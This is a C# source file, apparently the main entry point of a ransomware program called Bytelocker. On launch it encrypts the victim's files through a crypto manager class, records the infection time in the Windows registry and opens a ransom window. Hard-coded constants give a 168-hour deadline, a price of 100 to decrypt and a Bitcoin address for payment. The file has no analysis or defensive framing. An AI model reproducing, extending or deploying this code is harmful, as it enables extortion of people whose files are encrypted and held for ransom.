using Bytelocker.CryptoManager;
using Bytelocker.UI;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Bytelocker
{
    class Bytelocker
    {
        private static RegistryManager rm = new RegistryManager();
        public static int TIME_TILL_REMOVAL_HOURS = 168;
        public static int COST_TO_DECRYPT = 100;
        public static String BITCOIN_ADDRESS = "17hxeNzSThGXFpsNWQxgnkYSaxHMWiJXpL";

        public static void Main(String[] args)
        {
            Encrypt();
            LaunchWindow();
        }

        private static void Encrypt()
        {
            if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown")))
            {
                CryptoManagerMainHandler cmh = new CryptoManagerMainHandler();
                cmh.EncryptAll();
            }
        }

        [STAThread]
        private static void LaunchWindow()
        {
            rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown", true);
            if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "time_bool")))
            {
                rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "time_bool", true);
                rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "time", DateTime.Now.ToString());
            }
            

            MainWindow mw = new MainWindow();
            Application.EnableVisualStyles();
            Application.Run(mw);
        }

    }
}
